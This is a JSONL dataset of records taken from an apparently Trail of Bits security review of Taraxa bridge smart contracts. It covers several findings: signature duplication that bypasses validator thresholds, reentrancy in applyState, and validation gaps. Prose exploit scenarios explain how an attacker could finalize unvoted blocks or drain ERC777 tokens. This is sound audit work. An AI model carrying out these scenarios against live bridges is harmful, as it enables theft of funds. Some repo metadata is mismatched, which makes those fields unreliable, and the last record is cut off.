{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-003", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 3, "page_start": 11, "title": "G1 and G2 from method lack field point validation", "short_summary": null, "description_md": "#### Description\n\nBoth the G1.sol and G2.sol files' from method lack validation that the BLS12Fp points used to create G1 and G2 subgroup elements are valid field elements. In particular, they do not check that each of the BLS12Fp field elements fit into the modulus. This could lead to multiple issues and undefined behavior downstream when using various elliptic curve point functionalities, including pairings.\n\n```\n93 /// @dev Derive Bls12G1 from uint256[4].\n94 /// @param x uint256[4].\n95 /// @return Bls12G1.\n96 function from(uint256[4] memory x) internal pure returns (Bls12G1 memory) {\n97 return Bls12G1(Bls12Fp(x[0], x[1]), Bls12Fp(x[2], x[3]));\n98 }\n```\n\n*Figure 3.1: The from method in [G1.sol#L93-L](https://github.com/Taraxa-project/beacon-light-client/blob/b2eafadf37e466f7cbed3c5b1ca0a917f152137a/src/bls12381/G1.sol#L93-L98)98*\n\n```\n120 /// @dev Derive Bls12G1 from uint256[8].\n121 /// @param x uint256[4].\n122 /// @return Bls12G2.\n123 function from(uint256[8] memory x) internal pure returns (Bls12G2 memory) {\n124 return Bls12G2(\n125 Bls12Fp2(Bls12Fp(x[0], x[1]), Bls12Fp(x[2], x[3])),\nBls12Fp2(Bls12Fp(x[4], x[5]), Bls12Fp(x[6], x[7]))\n126 );\n127 }\n```\n\n*Figure 3.2: The from method in [G2.sol#L120-L127](https://github.com/Taraxa-project/beacon-light-client/blob/b2eafadf37e466f7cbed3c5b1ca0a917f152137a/src/bls12381/G2.sol#L120-L127)*\n", "full_markdown": "# 3. G1 and G2 from method lack field point validation Severity: **Informational** Difficulty: **Low** Type: Data Validation Finding ID: TOB-TARA-3 Target: beacon-light-client/src/bls12381/{G1,G2}.sol\n\n#### Description\n\nBoth the G1.sol and G2.sol files' from method lack validation that the BLS12Fp points used to create G1 and G2 subgroup elements are valid field elements. In particular, they do not check that each of the BLS12Fp field elements fit into the modulus. This could lead to multiple issues and undefined behavior downstream when using various elliptic curve point functionalities, including pairings.\n\n```\n93 /// @dev Derive Bls12G1 from uint256[4].\n94 /// @param x uint256[4].\n95 /// @return Bls12G1.\n96 function from(uint256[4] memory x) internal pure returns (Bls12G1 memory) {\n97 return Bls12G1(Bls12Fp(x[0], x[1]), Bls12Fp(x[2], x[3]));\n98 }\n```\n\n*Figure 3.1: The from method in [G1.sol#L93-L](https://github.com/Taraxa-project/beacon-light-client/blob/b2eafadf37e466f7cbed3c5b1ca0a917f152137a/src/bls12381/G1.sol#L93-L98)98*\n\n```\n120 /// @dev Derive Bls12G1 from uint256[8].\n121 /// @param x uint256[4].\n122 /// @return Bls12G2.\n123 function from(uint256[8] memory x) internal pure returns (Bls12G2 memory) {\n124 return Bls12G2(\n125 Bls12Fp2(Bls12Fp(x[0], x[1]), Bls12Fp(x[2], x[3])),\nBls12Fp2(Bls12Fp(x[4], x[5]), Bls12Fp(x[6], x[7]))\n126 );\n127 }\n```\n\n*Figure 3.2: The from method in [G2.sol#L120-L127](https://github.com/Taraxa-project/beacon-light-client/blob/b2eafadf37e466f7cbed3c5b1ca0a917f152137a/src/bls12381/G2.sol#L120-L127)*\n\n#### Recommendations\n\nShort term, call is\\_valid on each of the BLS12Fp points used to create G1 and G2 group elements.\n\nLong term, improve unit testing to uncover edge cases and ensure intended behavior throughout the system.\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-TARA-3", "target": {"path": "beacon-light-client/src/bls12381/{G1,G2}.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/crytic/slither", "org": "crytic", "name": "slither", "commit": null, "branch": null, "relative_file": "beacon-light-client/src/bls12381/{G1,G2}.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-TARA-3", "Target": "beacon-light-client/src/bls12381/{G1,G2}.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-004", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 4, "page_start": 12, "title": "Missing validation allows signatures to be duplicated to finalize any PillarBlock", "short_summary": null, "description_md": "#### Description\n\nThe finalizeBlocks function lacks proper validation of the lastBlockSigs argument and therefore allows any caller to arbitrarily inflate the number of signatures by duplicating the same signature in lastBlockSigs. This allows a PillarBlock that did not gain the required amount of validator votes to pass and be accepted as valid.\n\nFigure 4.1 shows that the lastBlockSigs argument is not validated and passed into the getSignaturesWeight function.\n\n```\n81 function finalizeBlocks(PillarBlock.WithChanges[] memory blocks,\nCompactSignature[] memory lastBlockSigs) public {\n 82 uint256 blocksLength = blocks.length;\n 83 uint256 weightThreshold = totalWeight / 2 + 1;\n 84 for (uint256 i = 0; i < blocksLength;) {\n...\n102 // skip verification for the first(genesis) block. And verify\nsignatures only for the last block in the batch\n103 if (finalized.block.period != 0 && i == (blocks.length - 1)) {\n104 uint256 weight =\n105\ngetSignaturesWeight(PillarBlock.getVoteHash(blocks[i].block.period, pbh),\nlastBlockSigs);\n106 if (weight < weightThreshold) {\n107 revert ThresholdNotMet({threshold: weightThreshold, weight:\nweight});\n108 }\n109 }\n...\n117 }\n118 }\n```\n\n*Figure 4.1: The finalizeBlocks function in [TaraClient.sol#L81-L118](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/eth/TaraClient.sol#L81-L118)*\n\nFigure 4.2 shows the getSignaturesWeight function. This function does not in any way prevent duplicate signatures in the list to cause a revert. As long as the signature signed the PillarBlock hash (pbh variable), it is deemed valid, and the accompanying signer's\n\n\n(=validator) vote count is added to the weight variable. This weight variable is returned to finalizeBlocks after all signatures have been processed. The finalizeBlocks function will then continue with validating that this weight is at least weightThreshold (highlighted in red in figure 4.1). By inflating the amount of signatures due to duplicate signatures, a malicious user can circumvent this check for PillarBlocks that lack the required amount of votes.\n\n```\n126 function getSignaturesWeight(bytes32 h, CompactSignature[] memory\nsignatures)\n127 public\n128 view\n129 returns (uint256 weight)\n130 {\n131 uint256 signaturesLength = signatures.length;\n132 for (uint256 i = 0; i < signaturesLength; i++) {\n133 address signer = ECDSA.recover(h, signatures[i].r,\nsignatures[i].vs);\n134 weight += validatorVoteCounts[signer];\n135 }\n136 }\n```\n\n*Figure 4.2: The getSignaturesWeight function in [TaraClient.sol#L126-L136](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/eth/TaraClient.sol#L126-L136)*\n", "full_markdown": "## 4. Missing validation allows signatures to be duplicated to finalize any PillarBlock\n\n| Severity: High                        | Diffi culty: Low       |  |\n|------------------------------------------|------------------------------|--|\n| Type: Data Validation              | Finding ID: TOB-TARA-4 |  |\n| bridge/src/eth/TaraClient.sol Target: |                              |  |\n\n#### Description\n\nThe finalizeBlocks function lacks proper validation of the lastBlockSigs argument and therefore allows any caller to arbitrarily inflate the number of signatures by duplicating the same signature in lastBlockSigs. This allows a PillarBlock that did not gain the required amount of validator votes to pass and be accepted as valid.\n\nFigure 4.1 shows that the lastBlockSigs argument is not validated and passed into the getSignaturesWeight function.\n\n```\n81 function finalizeBlocks(PillarBlock.WithChanges[] memory blocks,\nCompactSignature[] memory lastBlockSigs) public {\n 82 uint256 blocksLength = blocks.length;\n 83 uint256 weightThreshold = totalWeight / 2 + 1;\n 84 for (uint256 i = 0; i < blocksLength;) {\n...\n102 // skip verification for the first(genesis) block. And verify\nsignatures only for the last block in the batch\n103 if (finalized.block.period != 0 && i == (blocks.length - 1)) {\n104 uint256 weight =\n105\ngetSignaturesWeight(PillarBlock.getVoteHash(blocks[i].block.period, pbh),\nlastBlockSigs);\n106 if (weight < weightThreshold) {\n107 revert ThresholdNotMet({threshold: weightThreshold, weight:\nweight});\n108 }\n109 }\n...\n117 }\n118 }\n```\n\n*Figure 4.1: The finalizeBlocks function in [TaraClient.sol#L81-L118](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/eth/TaraClient.sol#L81-L118)*\n\nFigure 4.2 shows the getSignaturesWeight function. This function does not in any way prevent duplicate signatures in the list to cause a revert. As long as the signature signed the PillarBlock hash (pbh variable), it is deemed valid, and the accompanying signer's\n\n\n(=validator) vote count is added to the weight variable. This weight variable is returned to finalizeBlocks after all signatures have been processed. The finalizeBlocks function will then continue with validating that this weight is at least weightThreshold (highlighted in red in figure 4.1). By inflating the amount of signatures due to duplicate signatures, a malicious user can circumvent this check for PillarBlocks that lack the required amount of votes.\n\n```\n126 function getSignaturesWeight(bytes32 h, CompactSignature[] memory\nsignatures)\n127 public\n128 view\n129 returns (uint256 weight)\n130 {\n131 uint256 signaturesLength = signatures.length;\n132 for (uint256 i = 0; i < signaturesLength; i++) {\n133 address signer = ECDSA.recover(h, signatures[i].r,\nsignatures[i].vs);\n134 weight += validatorVoteCounts[signer];\n135 }\n136 }\n```\n\n*Figure 4.2: The getSignaturesWeight function in [TaraClient.sol#L126-L136](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/eth/TaraClient.sol#L126-L136)*\n\n#### Exploit Scenario\n\nEve calls the finalizeBlocks function with a PillarBlock whose last block has some votes, but not enough votes. Eve duplicates one of the signatures so many times as to pass the weightThreshold. The call succeeds, and a PillarBlock without enough votes was deemed valid and finalized.\n\n#### Recommendations\n\nShort term, prevent duplicate signatures from being accepted inside the getSignaturesWeight function, and instead trigger a revert in case of duplicate signatures.\n\nLong term, always validate inputs as much as possible. Also think of and handle edge cases such as duplicating values, passing zero values, and other ways of invalid input.\n", "severity": "High", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-TARA-4", "target": {"path": "bridge/src/eth/TaraClient.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Taraxa-project/bridge", "org": "Taraxa-project", "name": "bridge", "commit": "f82dd87c7e23358c74f7dc37451ca61110b60942", "branch": null, "relative_file": "bridge/src/eth/TaraClient.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-TARA-4", "Target": "bridge/src/eth/TaraClient.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-005", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 5, "page_start": 14, "title": "Incorrect mapping key used in validation inside registerContract", "short_summary": null, "description_md": "#### Description\n\nA check inside the registerContract function uses the wrong value for the key into the connectors mapping, which will likely result in this check always passing. In terms of the check itself, this does not currently pose a problem due to the other validations, one of which uses the right value for this same mapping to perform the same check a couple lines further down.\n\nThe connectors mapping is used to look up which connector should be used for a specific source contract. As such, the mapping's key is a source contract address, and the value is a connector address. At the end of figure 5.1 a line is highlighted in orange, which shows the correct setting of a value in this mapping where the key is the srcContract address and the value is a connector address.\n\nFigure 5.1 shows that the wrong value is used for the key in the connectors mapping (highlighted in yellow). However, a couple of lines down, the same check is performed with the right value for the key (highlighted in blue), so this important validation is performed.\n\n```\n142 function registerContract(IBridgeConnector connector) public payable {\n143 if (msg.value < registrationFee) {\n144 revert InsufficientFunds(registrationFee, msg.value);\n145 }\n146\n147 address srcContract = connector.getSourceContract();\n148 address dstContract = connector.getDestinationContract();\n149\n150 if (connectors[address(connector)] != IBridgeConnector(address(0))) {\n151 return;\n152 }\n153 if (srcContract == address(0)) {\n154 revert ZeroAddressCannotBeRegistered();\n155 }\n156 if (localAddress[dstContract] != address(0) ||\naddress(connectors[srcContract]) != address(0)) {\n157 revert ConnectorAlreadyRegistered({connector: address(connector),\ntoken: srcContract});\n```\n\n\n```\n158 }\n159\n160 address owner = OwnableUpgradeable(address(connector)).owner();\n161 if (owner != address(this)) {\n162 revert IncorrectOwner(owner, address(this));\n163 }\n164\n165 connectors[srcContract] = connector;\n166 localAddress[dstContract] = srcContract;\n167 tokenAddresses.push(srcContract);\n168 emit ConnectorRegistered(address(connector), srcContract, dstContract);\n169 }\n```\n\n*Figure 5.1: The registerContract function in [TaraClient.sol#L81-L118](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/eth/TaraClient.sol#L81-L118)*\n", "full_markdown": "# 5. Incorrect mapping key used in validation inside registerContract Severity: **Informational** Difficulty: **Low** Type: Undefined Behavior Finding ID: TOB-TARA-5 Target: bridge/src/lib/BridgeBase.sol\n\n#### Description\n\nA check inside the registerContract function uses the wrong value for the key into the connectors mapping, which will likely result in this check always passing. In terms of the check itself, this does not currently pose a problem due to the other validations, one of which uses the right value for this same mapping to perform the same check a couple lines further down.\n\nThe connectors mapping is used to look up which connector should be used for a specific source contract. As such, the mapping's key is a source contract address, and the value is a connector address. At the end of figure 5.1 a line is highlighted in orange, which shows the correct setting of a value in this mapping where the key is the srcContract address and the value is a connector address.\n\nFigure 5.1 shows that the wrong value is used for the key in the connectors mapping (highlighted in yellow). However, a couple of lines down, the same check is performed with the right value for the key (highlighted in blue), so this important validation is performed.\n\n```\n142 function registerContract(IBridgeConnector connector) public payable {\n143 if (msg.value < registrationFee) {\n144 revert InsufficientFunds(registrationFee, msg.value);\n145 }\n146\n147 address srcContract = connector.getSourceContract();\n148 address dstContract = connector.getDestinationContract();\n149\n150 if (connectors[address(connector)] != IBridgeConnector(address(0))) {\n151 return;\n152 }\n153 if (srcContract == address(0)) {\n154 revert ZeroAddressCannotBeRegistered();\n155 }\n156 if (localAddress[dstContract] != address(0) ||\naddress(connectors[srcContract]) != address(0)) {\n157 revert ConnectorAlreadyRegistered({connector: address(connector),\ntoken: srcContract});\n```\n\n\n```\n158 }\n159\n160 address owner = OwnableUpgradeable(address(connector)).owner();\n161 if (owner != address(this)) {\n162 revert IncorrectOwner(owner, address(this));\n163 }\n164\n165 connectors[srcContract] = connector;\n166 localAddress[dstContract] = srcContract;\n167 tokenAddresses.push(srcContract);\n168 emit ConnectorRegistered(address(connector), srcContract, dstContract);\n169 }\n```\n\n*Figure 5.1: The registerContract function in [TaraClient.sol#L81-L118](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/eth/TaraClient.sol#L81-L118)*\n\n#### Recommendations\n\nShort term, remove lines 150, 151, and 152, as this same check is already performed on line 156.\n\nLong term, add more inline documentation to the implementation. In particular, add comments that explain what if-statements are checking. This would have likely uncovered this incorrect mapping usage.\n", "severity": "Informational", "difficulty": "Low", "type": "Undefined Behavior", "finding_id": "TOB-TARA-5", "target": {"path": "bridge/src/lib/BridgeBase.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/crytic/slither-action", "org": "crytic", "name": "slither-action", "commit": null, "branch": null, "relative_file": "bridge/src/lib/BridgeBase.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Undefined Behavior", "Finding ID": "TOB-TARA-5", "Target": "bridge/src/lib/BridgeBase.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-006", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 6, "page_start": 16, "title": "Reentrancy in applyState can lead to breaking the contract and stealing hook-enabled tokens", "short_summary": null, "description_md": "#### Description\n\nThe lack of reentrancy guards on the applyState function allows the stealing of hook-supporting tokens by calling applyState recursively. Since no popular tokens support this standard or hooks in general, this limits the impact of this issue. However, because the epoch incorrectly increments whenever applyState is called through reentrancy, this will likely prevent the broken bridge contract's applyState function from accepting valid bridge messages, since the epoch does not match what is expected.\n\nThe applyState function can be called by anyone and will apply bridged messages (either from Ethereum to Taraxa, or vice versa). Inside this function, the epoch in the input arguments is validated to be one above the current epoch (called appliedEpoch, as highlighted in yellow in figure 6.1). At the very end of the function, the appliedEpoch is incremented (as highlighted in blue in figure 6.1). In the middle of the function, a loop over all of the bridged messages is performed; this will call the applyState function of the configured connector (as highlighted in green in figure 6.1). These will then transfer the tokens to the recipient (this could involve transferring an ERC20 token amount, minting an ERC20 token amount, or transferring an amount of the chain's native token).\n\nIn the case of an ERC20 transfer in which the token to be transferred is an ERC777 (or an otherwise hook-supporting token) contract, the recipient can use reentrancy to call back into the BridgeBase.applyState function with the same arguments. This works since appliedEpoch is incremented only at the end of the function.\n\n```\n175 function applyState(SharedStructs.StateWithProof calldata state_with_proof)\npublic {\n176 uint256 gasleftbefore = gasleft();\n177 // get bridge root from light client and compare it (it should be proved\nthere)\n178 if (\n179 SharedStructs.getBridgeRoot(state_with_proof.state.epoch,\nstate_with_proof.state_hashes)\n180 !=\nlightClient.getFinalizedBridgeRoot(state_with_proof.state.epoch)\n```\n\n\n```\n181 ) {\n182 revert StateNotMatchingBridgeRoot({\n183 stateRoot:\nSharedStructs.getBridgeRoot(state_with_proof.state.epoch,\nstate_with_proof.state_hashes),\n184 bridgeRoot:\nlightClient.getFinalizedBridgeRoot(state_with_proof.state.epoch)\n185 });\n186 }\n187 if (state_with_proof.state.epoch != appliedEpoch + 1) {\n188 revert NotSuccessiveEpochs({epoch: appliedEpoch, nextEpoch:\nstate_with_proof.state.epoch});\n189 }\n190 uint256 statesLength = state_with_proof.state.states.length;\n191 uint256 idx = 0;\n192 while (idx < statesLength) {\n193 SharedStructs.ContractStateHash calldata proofStateHash =\nstate_with_proof.state_hashes[idx];\n194 SharedStructs.StateWithAddress calldata state =\nstate_with_proof.state.states[idx];\n195 if (localAddress[proofStateHash.contractAddress] == address(0)) {\n196 unchecked {\n197 ++idx;\n198 }\n199 continue;\n200 }\n201 bytes32 stateHash = keccak256(state.state);\n202 if (stateHash != proofStateHash.stateHash) {\n203 unchecked {\n204 ++idx;\n205 }\n206 revert InvalidStateHash(stateHash, proofStateHash.stateHash);\n207 }\n208 if\n(isContract(address(connectors[localAddress[proofStateHash.contractAddress]]))) {\n209 try\nconnectors[localAddress[proofStateHash.contractAddress]].applyState(state.state) {}\ncatch {}\n210 }\n211 unchecked {\n212 ++idx;\n213 }\n214 }\n215 uint256 used = (gasleftbefore - gasleft()) * tx.gasprice;\n216 uint256 payout = used * feeMultiplier / 100;\n217 if (address(this).balance >= payout) {\n218 (bool success,) = payable(msg.sender).call{value: payout}(\"\");\n219 if (!success) {\n220 revert TransferFailed(msg.sender, payout);\n221 }\n222 }\n223 ++appliedEpoch;\n224 }\n```\n\n\n*Figure 6.1: The applyState function in [BridgeBase.sol#L175-L224](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/lib/BridgeBase.sol#L175-L224)*\n", "full_markdown": "### 6. Reentrancy in applyState can lead to breaking the contract and stealing hook-enabled tokens\n\n| Severity: High                        | Diffi culty: Medium    |  |\n|------------------------------------------|------------------------------|--|\n| Type: Undefined Behavior           | Finding ID: TOB-TARA-6 |  |\n| bridge/src/lib/BridgeBase.sol Target: |                              |  |\n\n#### Description\n\nThe lack of reentrancy guards on the applyState function allows the stealing of hook-supporting tokens by calling applyState recursively. Since no popular tokens support this standard or hooks in general, this limits the impact of this issue. However, because the epoch incorrectly increments whenever applyState is called through reentrancy, this will likely prevent the broken bridge contract's applyState function from accepting valid bridge messages, since the epoch does not match what is expected.\n\nThe applyState function can be called by anyone and will apply bridged messages (either from Ethereum to Taraxa, or vice versa). Inside this function, the epoch in the input arguments is validated to be one above the current epoch (called appliedEpoch, as highlighted in yellow in figure 6.1). At the very end of the function, the appliedEpoch is incremented (as highlighted in blue in figure 6.1). In the middle of the function, a loop over all of the bridged messages is performed; this will call the applyState function of the configured connector (as highlighted in green in figure 6.1). These will then transfer the tokens to the recipient (this could involve transferring an ERC20 token amount, minting an ERC20 token amount, or transferring an amount of the chain's native token).\n\nIn the case of an ERC20 transfer in which the token to be transferred is an ERC777 (or an otherwise hook-supporting token) contract, the recipient can use reentrancy to call back into the BridgeBase.applyState function with the same arguments. This works since appliedEpoch is incremented only at the end of the function.\n\n```\n175 function applyState(SharedStructs.StateWithProof calldata state_with_proof)\npublic {\n176 uint256 gasleftbefore = gasleft();\n177 // get bridge root from light client and compare it (it should be proved\nthere)\n178 if (\n179 SharedStructs.getBridgeRoot(state_with_proof.state.epoch,\nstate_with_proof.state_hashes)\n180 !=\nlightClient.getFinalizedBridgeRoot(state_with_proof.state.epoch)\n```\n\n\n```\n181 ) {\n182 revert StateNotMatchingBridgeRoot({\n183 stateRoot:\nSharedStructs.getBridgeRoot(state_with_proof.state.epoch,\nstate_with_proof.state_hashes),\n184 bridgeRoot:\nlightClient.getFinalizedBridgeRoot(state_with_proof.state.epoch)\n185 });\n186 }\n187 if (state_with_proof.state.epoch != appliedEpoch + 1) {\n188 revert NotSuccessiveEpochs({epoch: appliedEpoch, nextEpoch:\nstate_with_proof.state.epoch});\n189 }\n190 uint256 statesLength = state_with_proof.state.states.length;\n191 uint256 idx = 0;\n192 while (idx < statesLength) {\n193 SharedStructs.ContractStateHash calldata proofStateHash =\nstate_with_proof.state_hashes[idx];\n194 SharedStructs.StateWithAddress calldata state =\nstate_with_proof.state.states[idx];\n195 if (localAddress[proofStateHash.contractAddress] == address(0)) {\n196 unchecked {\n197 ++idx;\n198 }\n199 continue;\n200 }\n201 bytes32 stateHash = keccak256(state.state);\n202 if (stateHash != proofStateHash.stateHash) {\n203 unchecked {\n204 ++idx;\n205 }\n206 revert InvalidStateHash(stateHash, proofStateHash.stateHash);\n207 }\n208 if\n(isContract(address(connectors[localAddress[proofStateHash.contractAddress]]))) {\n209 try\nconnectors[localAddress[proofStateHash.contractAddress]].applyState(state.state) {}\ncatch {}\n210 }\n211 unchecked {\n212 ++idx;\n213 }\n214 }\n215 uint256 used = (gasleftbefore - gasleft()) * tx.gasprice;\n216 uint256 payout = used * feeMultiplier / 100;\n217 if (address(this).balance >= payout) {\n218 (bool success,) = payable(msg.sender).call{value: payout}(\"\");\n219 if (!success) {\n220 revert TransferFailed(msg.sender, payout);\n221 }\n222 }\n223 ++appliedEpoch;\n224 }\n```\n\n\n*Figure 6.1: The applyState function in [BridgeBase.sol#L175-L224](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/lib/BridgeBase.sol#L175-L224)*\n\n#### Exploit Scenario\n\nEve holds 1,000 of an ERC777 token called TokenX in a contract she has deployed (called AttackerContract). Eve bridges these 1,000 TokenX from Ethereum to Taraxa. Eve's 1,000 tokens are now locked inside the configured ERC20LockingConnector on Ethereum. After bridging to Taraxa, she immediately initiates a bridge of 1,000 TokenX from Taraxa back to Ethereum.\n\nShe now monitors the Ethereum chain to spot the first time anyone tries to call the EthBridge.applyState function to bridge messages, which includes her bridging message. Once she spots it, she front-runs the transaction and calls EthBridge.applyState with the same arguments.\n\nThe message handling loop will now call the TokenX.transfer function to transfer the 1,000 tokens to AttackerContract, after which the ERC777 \\_callTokensToReceived hook will call AttackerContract. Inside the called AttackerContract function, a call is made back to EthBridge.applyState with the same arguments as the original call. This will lead to a loop where each time EthBridge.applyState is called, the AttackerContract will receive 1,000 TokenX tokens.\n\nThe only limitations of this attack are gas, the amount of TokenX inside the ERC20LockingConnector, and the failure of other bridging messages due to lack of tokens or multiple executions.\n\n#### Recommendations\n\nShort term, add reentrancy guards to the BridgeBase.applyState function. This will prevent the aforementioned issue.\n\n#### Long term:\n\n- Use [Slither](https://github.com/crytic/slither) to detect this issue, and integrate it into the CI using [slither-action.](https://github.com/crytic/slither-action)\n- Review all non-view functions and consider adding reentrancy guards to each of these functions.\n- Update the implementation to follow the [Checks-Effects-Interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy) pattern. This pattern is considered a best practice and structures the code in a manner that helps prevent reentrancy vulnerabilities.\n", "severity": "High", "difficulty": "Medium", "type": "Undefined Behavior", "finding_id": "TOB-TARA-6", "target": {"path": "bridge/src/lib/BridgeBase.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/crytic/slither-action", "org": "crytic", "name": "slither-action", "commit": null, "branch": null, "relative_file": "bridge/src/lib/BridgeBase.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-07-taraxa-bridge-smart-contracts-v2-securityreview.pdf", "source_mtime": "2025-11-01T20:47:29.319395+00:00", "report_extracted_at": "2025-11-12T02:10:17.697113+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:10:17.699214+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Medium", "Type": "Undefined Behavior", "Finding ID": "TOB-TARA-6", "Target": "bridge/src/lib/BridgeBase.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview-007", "doc_id": "trailofbits_2024-07-taraxa-bridge-smart-contracts-v2-securityreview", "finding_index": 7, "page_start": 19, "title": "Confusing application of settlementFee to locking native assets", "short_summary": null, "description_md": "#### Description\n\nThe process of deducting the fee from the passed in msg.value is confusing and makes it difficult for callers to transfer a specific amount of native assets.\n\nFigure 7.1 shows the lock function, which deducts the settlementFee from the amount to be bridged. A more user-friendly way of doing this would be to add an argument to the lock function called amount that indicates the exact amount to bridge. In the body of the function, a check is then performed that ensures that the difference between msg.value and amount is exactly the settlementFee.\n\n```\n37 function lock() public payable {\n38 uint256 fee = bridge.settlementFee();\n39 uint256 lockingValue = msg.value;\n40\n41 // Charge the fee only if the user has no balance in current state\n42 if (!state.hasBalance(msg.sender)) {\n43 if (msg.value < fee) {\n44 revert InsufficientFunds(fee, lockingValue);\n45 }\n46 lockingValue -= fee;\n47 }\n48\n49 if (lockingValue == 0) {\n50 revert ZeroValueCall();\n51 }\n52 state.addAmount(msg.sender, lockingValue);\n53 emit Locked(msg.sender, lockingValue);\n54 }\n```\n\n*Figure 7.1: The lock function in [NativeConnectorLogic.sol#L37-L54](https://github.com/Taraxa-project/bridge/blob/f82dd87c7e23358c74f7dc37451ca61110b60942/src/connectors/NativeConnectorLogic.sol#L37-L54)*\n", "full_markdown": "# 7. Confusing application of settlementFee to locking native assets Severity: **Informational** Difficulty: **Low** Type: Arithmetic Finding ID: TOB-TARA-7 Target: bridge/src/lib/BridgeBase.sol\n\n#### Description\n\nThe process of deducting the fee from the passed in msg.value is confusing and makes it difficult for callers to transfer a specific amount of native assets.\n\nFigure 7.1 shows the lock function, which deducts the settlementFee from the amount to be bridged. A more user-friendly way of doing this would be to add an argument to the lock function called amount that indicates the exact amount to bridge. In the body of the function, a check is then performed that ensures that the difference between msg.value and amount is exactly the settlementFee.\n\n```\n37 function lock() public payable {\n38 uint256 fee = bridge.settlementFee();\n39 uint256 lockingValue = msg.value;\n40\n41 // Charge the fee only if the user has no balance in current state\n42 if (!state.hasBalance(msg.sender)) {\n43 if (msg.value < fee) {\n44 revert InsufficientFunds(fee, lockingValue);\n45 }\n46 lockingValue -= fee;\n47 }\n48\n49 if (lockingValue == 0) {\n50 revert ZeroValueCall();\n51 }\n52 state.addAmount(msg.sender, lockingValue);\n53 emit Locked(msg.sender, lockingValue);\n54 }\n```\n\n*Figure 7.1: The lock function in 